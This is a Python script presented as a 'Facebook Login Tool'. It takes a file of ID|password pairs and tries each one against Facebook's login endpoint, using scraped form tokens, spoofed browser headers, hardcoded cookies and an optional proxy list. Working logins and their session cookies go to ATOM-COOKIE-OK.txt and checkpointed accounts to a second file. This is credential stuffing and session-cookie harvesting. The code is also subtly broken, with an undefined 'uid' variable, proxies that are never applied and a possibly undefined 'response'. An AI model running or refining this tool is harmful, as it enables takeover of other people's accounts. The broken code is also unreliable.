import os, time, random, re, sys, requests

oks, cps, bkas = [], [], []
loop = 0

try:
    xvx = open('/sdcard/proxy.txt', 'r').read().splitlines()
except:
    xvx = ["http://127.0.0.1:8080"]

logo_text = "🔐 Facebook Login Tool (One ID at a time) 🔐"
linex = lambda: print('-' * 50)
check_lock = lambda cid: "live"

os.system('clear')
print(logo_text)

dfile = input('\n📄 ENTER FILE PATH (e.g., sdcard/mahadi.txt): ')
try:
    dx = open(dfile, 'r').read().splitlines()
except FileNotFoundError:
    print('❌ FILE NOT FOUND...')
    time.sleep(1)
    sys.exit()

if not dx:
    print('❌ FILE IS EMPTY...')
    time.sleep(1)
    sys.exit()

for user in dx:
    os.system('clear')
    print(logo_text)
    print("📲 TOTAL ID : 1")
    print("🔄 PROCESSING ONE ID...")
    linex()
    try:
        ids, pw = user.split('|')
        ids, pw = ids.strip(), pw.strip()
    except:
        continue
    sys.stdout.write(f"\r ⏳ (M5) ({loop}) (OK-{len(oks)}) (CP-{len(cps)})\r")
    sys.stdout.flush()
    try:
        nip = random.choice(xvx)
        proxs = {'http': nip}
        Session = requests.Session()
        free_fb = Session.get('https://m.facebook.com').text
        data = {
        'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
        'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
        'email': uid,
        'timezone': '-330',
        'lgndim': 'eyJ3IjoxNDQwLCJoIjo5MDAsImF3IjoxNDQwLCJhaCI6ODYwLCJjIjoyNH0=',
        'lgnrnd': '060331_lb2E',
        'lgnjs': '1751375011',
        'ab_test_data': '/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP/ffPPfPAABFAI',
        'locale': 'hi_IN',
        'next': 'https://www.facebook.com/settings/applications/app_details/?app_id=293471457383333',
        'guid': 'f13465d1007fbcb28',
        'prefill_contact_point': '',
        'prefill_source': 'browser_dropdown',
        'prefill_type': 'password',
        'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),}
        cookies = {
        'datr': 'kqFRaB1m-_9lS30TJrCcYC28',
        'sb': 'kqFRaADAhKyR-m_DobFeaU6C',
        'ps_l': '1',
        'ps_n': '1',
        'locale': 'hi_IN',
        'fr': '0ugbVyuFAdiFSXbdX..BoUaGS..AAA.0.0.BoY9wG.AWcLS89ZvTPUI126sFbmRUmbVYc',
        'wd': '885x751',}
        headers = {
        'authority': 'www.facebook.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        'dpr': '1',
        'origin': 'https://www.facebook.com',
        'referer': 'https://www.facebook.com/settings/applications/app_details/?app_id=293471457383333',
        'sec-ch-prefers-color-scheme': 'dark',
        'sec-ch-ua': '"Not=A?Brand";v="99", "Chromium";v="118"',
        'sec-ch-ua-full-version-list': '"Not=A?Brand";v="99.0.0.0", "Chromium";v="118.0.5993.159"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-model': '""',
        'sec-ch-ua-platform': '"Windows"',
        'sec-ch-ua-platform-version': '"10.0.0"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
        'viewport-width': '885',}
        url = 'https://www.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100'
        response = Session.post(url, data=data, headers=headers, cookies=cookies, allow_redirects=False)
        cookie_data = Session.cookies.get_dict()
        if "c_user" in cookie_data:
            cid = cookie_data["c_user"]
            coki = ";".join([f"{k}={v}" for k, v in cookie_data.items()])
            print(f"\n✅ OK: {cid}|{pw}")
            print(f"🍪 Cookie: {coki}")
            open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
            oks.append(cid)
        elif 'checkpoint' in cookie_data:
            print(f"\n⚠️ CHECKPOINT: {ids}|{pw}")
            open('/sdcard/ATOM-CP.txt', 'a').write(f'{ids}|{pw}\n')
            cps.append(ids)
        else:
            print("\n❌ FAIL: Login not successful.")
    except Exception as e:
        print(f"\n⚠️ ERROR: {e}")
        time.sleep(2)
    loop += 1
    linex()
    print(f"🔍 Response Code: {response.status_code}")  # <-- Added response code print
    print("🔚 PROCESS COMPLETE.")
    linex()
    input("➡️ PRESS ENTER TO LOGIN NEXT ID...")
